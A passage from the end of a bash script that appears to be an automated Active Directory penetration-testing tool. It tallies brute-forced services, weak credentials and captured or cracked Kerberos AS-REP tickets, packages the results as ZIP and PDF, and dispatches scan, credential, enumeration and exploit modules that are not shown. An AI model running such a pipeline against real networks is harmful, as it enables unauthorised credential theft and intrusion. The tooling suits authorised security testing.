        echo -e "FOUND $(cat $dir/*/enabled_expired_users.txt | grep -i "PasswordNeverExpires : True" | wc -l) NEVER EXPIRE USERS &  $(cat $dir/*/enabled_expired_users.txt | grep -I "Enabled              : False" | wc -l) DISABLED USERS" >> "$dir/$casesum"
        echo -e "ATTEMPTED TO BRUTE-FORCE A TOTAL OF :: $(ls $dir/*/*-brute-*.txt| wc -l) :: SERVICES" >> "$dir/$casesum"
        echo -e "FOUND :: $(cat $dir/$casesum | grep -e password: -e SUCCESS -e Valid | wc -l) WEAK USER PASSWORDS & $(cat $dir/$casesum | grep -e Valid | wc -l) WEAK DEFAULTIVE OR COMMON CREDENTIALS" >> "$dir/$casesum"
        echo -e "GRABBED $(cat $dir/kerberos_tickets.txt | grep "krb5asrep" | wc -l) KERBEROS TICKETS OF WICH $(cat $dir/kerberos_tickets.txt | grep "CRACKED" | wc -l) WERE CRACKED" >> "$dir/$casesum"
        echo -e " " >> "$dir/$casesum"
        echo -e "${grn}[-] JOB DONE [-]" >> "$dir/$casesum"
        echo -e "${grn} $(cat $dir/$casesum | tail -10 )${norm}"
        echo -e "${yel}[-] COMPRESSING RESULTS TO $dir[-]${norm}"
        zip $dir.zip $dir/* #zip the results directory in the PWD
        exit
}

function PDF (){

    echo "converting to PDF..."
        cd $dir
        enscript * -p Network.pdf
        for host in $(cat $dir/NetHosts.txt); do
            enscript $dir/$host/* -p $host.pdf
        done
}


    function execute_mode_case () { #the compiled options case for full and basic
    case $mode_case in

    1)

    echo "Basic mode selected"
    echo -e "Basic mode selected \n ------------------------------------------------------" >> $dir/$casesum
    sleep 1

        module_scan
        ad_credentials
        module_enumerate
        module_exploit
        PDF
        summery
    ;;

    2)

    echo "Intermediate mode selected"
    echo -e "Intermediate mode selected \n ------------------------------------------------------" >> $dir/$casesum
    sleep 1
        module_scan
        ad_credentials
        module_enumerate
        module_exploit
        PDF
        summery

    ;;

    3)

    echo "Advanced mode selected"
    echo -e "Advanced mode selected \n ------------------------------------------------------" >> $dir/$casesum
    sleep 1
        module_scan
        ad_credentials
        module_enumerate
        module_exploit
        PDF
        summery
    ;;

    *)
    echo -e "${red}Invalid option${norm}"
    level_select

    ;;

    esac
}
execute_mode_case